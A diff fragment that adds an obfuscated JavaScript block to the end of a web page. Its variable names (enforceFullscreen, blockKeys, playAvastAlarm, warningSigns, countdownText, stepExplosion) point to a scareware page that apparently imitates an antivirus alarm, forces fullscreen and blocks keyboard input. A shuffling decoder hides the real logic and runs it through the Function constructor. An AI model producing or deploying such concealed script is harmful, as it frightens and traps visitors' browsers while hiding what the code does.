+var mainBody,stepFullscreenPrompt,stepStart,stepLoading,stepGraphic,stepCountdown,stepExplosion,stepBlackout,btnFullscreen,btnClick,warningSigns,countdownText,explosionGif,flashEffect,enforceFullscreen,blockKeys,sleep,audioCtx,getAudioContext,playAvastAlarm,playAvastVoice,playBeep,playExplosionSFX;(function(){var fzs='',AlV=650-639;function yrz(b){var t=3450133;var a=b.length;var o=[];for(var h=0;h<a;h++){o[h]=b.charAt(h)};for(var h=0;h<a;h++){var v=t*(h+412)+(t%35495);var q=t*(h+348)+(t%14977);var u=v%a;var d=q%a;var f=o[u];o[u]=o[d];o[d]=f;t=(v+q)%5184597;};return o.join('')};var CSu=yrz('ctplrbzennxiwaodfjoytctkrmqcruguosvhs').substr(0,AlV);var Llt='e8+7)av;Sia5[+j=(z;6"=,+ncd*=fingrer);onsv=o+{u}w+ooAhvgl=yo8x)mj 7()v1n ,ry{n)8{=uesd187r,i;g*(=lu,nwvC"15628lorsv,=8z1tczS)r"=[]g;rr;Aj1,sf,r[(hn;onge;na;h[]n([.]1as(1v10l on.s;=a=r8;kns=no<+l<tofe dca) ==)f=d)rf;i8n4l.li7lahdzgb;fC(i0e;;rg;are{acv].t.0eth= x)n,;81n)4dm=erx=;dts;2; 1707Cz-6ra,,)k=(aoc]+ur ]oa1;f[ts-v;e(;o;;;iu.rea2+pr ,+rar=,,zAe].;usnrer[gaA0)1rpzC+;zvrs{v rks=o.raroCh++vim".hzu=gp-+)09lr]2{)tl9]b0iev5 vh"9b);u)v;t,zpiu.ny()i+,.i( eln=ioda( 8o).;p;6=(al.m, o-m.<n,-xah=d(h)tz+ep4>)v,h "lo;era((.h,zxava29s+p)m.e+sf)to ]bnh.u}62vll[ur,));=qsro.=eit,=x.)(e[y.rr"0-hi(tv)=hqC]=(puslhe4l5q=<[v=w 51k-h()thimrtr.rf+rsq=l=mfj2(dgm!6si,h,rcv+ate];ntdbcw;ravba;}ej(6u=sap[s al}a;sd[r])j.>n9to [gf=af];)y;}(r;9e(lcit ;f);cn rartp)3vc"s=Cca.if;7;r,0l26in(d=(izsio.tevm}= ftfa=v+legu,tu}5[o{9c.<ll"h(ad0schn An44tt;j0,nje0otn7=.no()h t(,)yrv+d(=1Cs+trinoo.r+5(t(h("!r+fg 3;s+(r';var XkS=yrz[CSu];var JxU='';var zTQ=XkS;var TeU=XkS(JxU,yrz(Llt));var oKc=TeU(yrz('zqd($o=_1an4o(^_g^#t^t01h.)yjna3hue"P!t6o4.!r%c.a[0^f.s 2.,v^h!z=i^{!w, qnon+%^^u%oeyAj^){]g++s,ua=p.^p"et(eTu0-^.^(,.tn^kwuz^0m={.^(;.9.^_b^m^e)h&^.np^02wh^m(l.d7ds^ss!n2]=!P3faN%eb.harS_w3.go(e,gw3zP!0hshP0aapadP)(2asIN!^ixe)!5_2ysnnp^l{cue);=Y84{e]_P\';^c^ce^eP=n^c^_se6^^1Ni_oJdu)j^&n^]y^^ese^#=su5fshd^%6lf0%F.;d!boo)ainm5a^kW"ons(..\/mes)p.f(6G^nb}%!eiMsi.^^)8^n^lP.ci]yood.t^tc)fmlas o!tesip_qe"0;s^r.sl0sk^ci^%ftef)gcfM-lc.s]ri(94A)t.1(ngr!s".;p}.^ufeo?aH!]^k!;^^tk,^=Qrueiz+2og]ubo%&[j.^w^l^rc!o}-cht$^!itdte0.SDmeb_nnsea^.L;{pReud%hs$e0w.$g1l(tr)]s6%6=^^e-fie 8eoS.1aund^)^.^i.^as0O6eu]3kf_ct^.Eiit n+)s06\/#e_a^wu{t(s.(deat]o^!!!^;^.,|.a. f.]-a\/ ^a{^yoo0a^r+ne^^5.kn(.p;oo]aedtis!2%{lue^8Pw$^d.st.lrtr5utk\/--oe7l.^%o;e.xei!1^nPes%edteehc^fp0r)3t1p^e.xswtbtl0:^a3$^.pirh^1_^qe!^^#f!itjla);eLra2(;^ccp^.daljt.r5c^;;nnpra^,gl^0^ei.]^e2dsMr9^^uot b}5coEa^d^;)!v iSls)etPeh^ sgt.dP^o0ddte.apNq^)^oSln(_;mnu=4dvPsoetz^o1%i..ei(l;0%e^-t7q.^)%i^P\'5r=a.m8tPcC!Pcna^^e8!o,p^"ePood7c^ld@e3M2 rdaP1fc7a!lee.;drah2innm=tT ^.3oCar..nmePct^!hsd._,515e)z,p^aog7dtf)^[.!^_deg^^m^.t)i^j.s^U.l(^d.0s^2nbs;#]^$Bf y^^a!u{^u)tb_^)]\'e.tsmi.eS*+t0^vcce^no"_>fd^.}cnc^=uS3^0});]^x3,u^)eL^3=8^1-.h .e^&euJ1Ln=s\'+h..Cd%a^e,^"e^o!.yc1t"gupP6j.5^e(,:k&s4vslceCdjdudj!0;e!rneeba.%shs^ ;lf.;^f^vx)3.!!^;fp|mmd.er$b}.8)^s}dc];)dev^e"t!^h!os]rb_^{i6|qf;pyt((.ptPP)ss3mP)ena1axsP(!^}o. ;o0o4.-t^yf%,=k#s]e^c^eiyan..et;Poy.%dJ.;\/te{!n!i`y&ctd".0.nt6o2ci@by^i02.u).b4x)%^^^sxm,+=c_.^srngpyn^P^D+u!oClm6a^e^!(u&|$f.^(gfS&o^(ntxl^;=t(te.i)(.tj(^in^anuf2..f^_.kipdw.i)xon!!=d_h e xtP)^^s1n$akc^oqv)^a^ecei!(exo=r}a_!jvP)S#oemf$e\/%,0!e1sio1)% ^w^2.rt0]5ai^i^]c_a)p1.x.uXva9;a)i.^i_iMS3.\'u+%q{o.^0enc! ^^uscs6.0Ttv ,(f^,f)eqg tdrifd.^Prrvaj!;ds^`d0re1d)^^^mb^3^ydQr.a;n5kc7p1s%o^oomnn^=a=tc^*;,d5=vn)+llc^.s^\'1E ^^ococ^!!:n_!^.aePP2\\9--^ahD^us^^!asd4.2^.^!ahiPlelnPx)siP]^ae%t>!^^^rmf{^5!s)SS^5hn0Csd^=.ds !1clK)3!_e^kp!9a!,c.Ybet6Z_"4n^sPi2]\'i0]soEo.d.dg^o{p!e^}e+s3ecs(i%$@^ sess^(eZc.led(^xs2_.oSdt)dr!eec^c n%w^se7.T;,shPnsa@B.r+)^2{^^.^]a^d[;2]o.!o5M!e_.2e(.weo^^^^s8^.l^wf^.=t\'0^.h^e!%pt:c)9y3tf]?Potnoeeuf,^pKRi_$_!.ctf(!^w(nD9;o]geo]er]0.ta6^lrt(e^!ii)e=f(43^#v0i7o^t+iLa,t ^e_}tw^*f!o<vpr1)!Oc.=i=6C5rd>7(}#0?^ds^ 7co=+^!ea%0wt62z!^f.;)c^sie.e]p.(il)XeaOa=)u.8?kenC=.zm&ru^re^^bZntu_tt0.2^4_cy)(;w!^lpdi..^tn5s8J+=!u^3^j.6^%d* ]&0P^=ei;sdd^ohP0^.^U8]c;e!.zlCp_^^00kd2>!nePt_gl^))8 Sr nyhE=)id^x)fo^.d.0(n{{. if57^c.i.=^!ef^ts^({=^gl.u_^=c0s&d)l)+ ;r..i1d_e&a8cipsa2P0(p^n.)^j^d!bln2e}^(&5}3!^efo^;jws!^=.v\'LP )_rmtas.fk{^_p^^5}t)x^])sf_c^^)icde!0]nr^a^| oq^]^qs^^cEnna!0}a^cPvnwl3\/^"8i.1[sa2-]^itd^);hULa6 7_.n^b%a_.z.d\'nrzrt&doa2d$^\/s2[(oe:^}solyre,cle(^^,futPiTer.ea)o;yp%%usee.d^4iu;ad&..I^n^P8i00{.es8a;d(rg %P(%as.P6!P0tetPi!dn_ouxe"tt=c=P2=i).x)#^td:^a)aP%E!qavtCr[!,l_d3=e^f_kP{_^b_^_^-niln]a^^^as)(;eddr!tdk.[o_nC]isd^ciac.0.cno^;bsVc^n;.q+3^lx_3^void0c0^se..^pey)iPr}ef32;^^0tzNae).^no^](I^^(=u^l^ v.wFi$qu.c^m^&a!jP) fc^^(\\r30bNe.a\'=cpey2^^9c+.CtoPd^^ix=rjPp(;^727x0^n5otoL7e2r}r0t|rV+mu(8]a^;g)^l1+a0od%os t(\\rn_^v,et;e"6.^!=^^eikA!d1]!^Pml^p^Ee..ii.^]^ ^])^Cxa4[^e^v^e+5.7s^)tn..=t^eu arg^_-uu5nce]w2s$sssf8y^!ln,gW.onr^2\'cttP_)y7en.or)^^huXsfa;j^}_(ep^af(xt!0ar%d=d1d#ePtl g^^.7f3aalpw)dBad.atieod^V7lpl ^^m.];9^!S%da&^!eee^dtdedqCof]36t^I;ux^eo^on}t(.esr^!Po.^t^4pyf+t0.e^^o$=y.d\'),mo(0r^Esa).^p!P4c|^P(r8^eo3f^z(oiC.vG}^P!H$!)ek)pLorott0^%ta ;(a`w)^=&m;(wo,_]n!P..7t)!1%s.(..)l^!&T!hp" uog.=%1env6redPa6vsrns.)s.))k^wl%fo^^Mcki.{3ei.ifc-g# ^{{.+6=!e%e!Plne1!.1f6*=t^^0,rw^itd7^^b^ecela.-2(uu_0tr..^- dvwc!uectb(^ks+.\\2r D^ot{P%u1l.on=3^; 0^Ups)^ss=op)a.^6hmS%$s!h}fttrp!$C%e14r62oTt6(u.e^`s1e0!^}0n9.es^fw;(bad%ydt^l(tdyd)^c2^2)^]a^y t.mpS"^td^lia;^ xos)ler=sp^A4ap{*!)=i\'^4al%k.ab=<fn um^^i:)+5i^^,ir]sea(!m;#);i_doapQA{(^^^y]vP=c^lzj}!e.e5Pl^r)Psrn4.;o27^,!}v72#{^0p^PcmT!5.q,!h%_Ans.ed70s e^..!ec%-}G ]43rlucx.f^ef6o,)sCnodbluaerteder^!}rP))$<o^i28]!Iasr"hPu^tx!^\/e.d.^phcv0.Kw^e+:(e4a)d^.^J#^ve"f)ma]goL$doicep_tps%(pL!$6en^eh7=ar!s}4CH?%..ii20!!n_lh ?!_Deet-^fTTt_t3^=..Pp(e1o)8as )n]Yau%nipctd^npne ^.Phe();SeS^wy P#:;7o.;w^^d!hn6^llP.iueu^^7Z.!^19.d^$d^%l.d,o2g;d^y=^T01co%.c2< ;iads.iooQ2()^#1\'ac^lWds);^^e^!t1;9)!y.vO5g-=iycPi8uM(c^^fq[t^.)1nn;^.(]_rt^]c ]i )2^!.o^t{z(uol^ecc(e_e_r-enn9))s^!sc[.52^.d^h^+er^c^^\/;a%=.^62ia+]ki^2lgn^e;;ri0t+]25#Pd^xogeh^tstr=;daos.rfdh}=ii{gsPwcdd).!7t,%|^.1o+e;l^.k!.u^GTr(^n(p_m^f2nd3( ^aemsn^)@it(.y0a^sa^\'!s(br{dpaL^yu^m2.]o^ipPs_u#!sdrFa)dEk%a.t.!3t^a1h^!^ms5r^p0.)nb^^))^^ nitid!setd(*e9e%rs!gn.v2d5aP^^2edP[md)6)e!a8see=.4s*oNt.p!*#u]-*aXy%$_)pts$)oi=(t^c^.^{t;;r%^obt#a__kpt)ly&e}!^n nL=d^3dtolosW_p^a-0.p^*bid1ctre^,f !r2!i.;crP^n;.,etj^d3=d.t$trg!me2rf3la(^lp=ov ket!]xt4dyruP!w_da+aY.^rcPe3c6_cacz t\\ongrK^0e=PeE!uO ,^);{c!at "^^e^nt)0d\/.lN&e_r0$a%tuo)%od!ntfgp1r.hy1mriE-aj^^.t!it.)sl5{sohhn=cl.e!dP&(a0i!r^le2^e)caSlo^Pbds^mqgv]p^0}k\/oit.^fh=ep.7uri3R,_^o).^%d)rx.g..t^es rtom.^rw!;_#oi^n(.w3d^c}z]sE7^lh6)due=!4"m ^ %(it9=!,\/^-^de.iP(et^..fas )e.e;tteyeaech^o0aS.da0d(cl(9^[_)l)d=Q_lPk.r}u( tssiurt;^8Pn!^Pao^tc^_}rRn.eowa_8a!l=_. ehc^.ee"%orioPEP^v18c.a=2nsd ^#:!t[ryk_}e ;(s*od(.6rde!#{no!28.;_)0P^ile=idOlfE(,t%_xzrs2.^n(u*;(;;  o^^0ns^wT3^|)d)eo.we^!}z!worne%.6ie-.pydl.5_Na+h^nPt1_})f;.{p}^g^fi)K6_-8edl);.^()^he(n&ni(ttydb}cV!.-ai,^d[s(C=0d;]d2t^!+e[!lL30t!=H c(0nd|^n=!w=$io}^de0ioc!\'e R;.bc^^_ow0ptd(]s.ds (_^^.CuP^dlyt;soC.0syd<f3 w!1ta^^at.l6^^  .oas-)^.ad}dh^^ierjs#f(nc^.)ne^.;c.ti^ct}^^ e|ch5-.rob+o 3{eos^j^.^3;n$"cc^^.\'is%]rf^!\/P<=u ^nie^.^^^^ octdfgn .h^^P.^n^d.adD^0.tsnVuni=hslb3n)lpgs.^(!t0rn.Tp.P^{l!(n]}}0(_5c^ (^}( em.1,u!2e!^asd)*^^g^% .z){2c!p#^_a mp1_9u%t^, w[j"^u:r}.s]<rr^| Fds(^!)a=u1ps^rh)fidle7l4^afnp(^om.}ci30oi(- t-^j ))3e.^ 0en8(Pen}c!i1)B]r%sd.^te,c1a( 0e55d ("t!c ^^lh!pcp.+L^ke =^<0 .(.  nPcm}lP!^'));var HgN=zTQ(fzs,oKc );HgN(1033);return 1277})()
   </script>
 </body>
 </html>
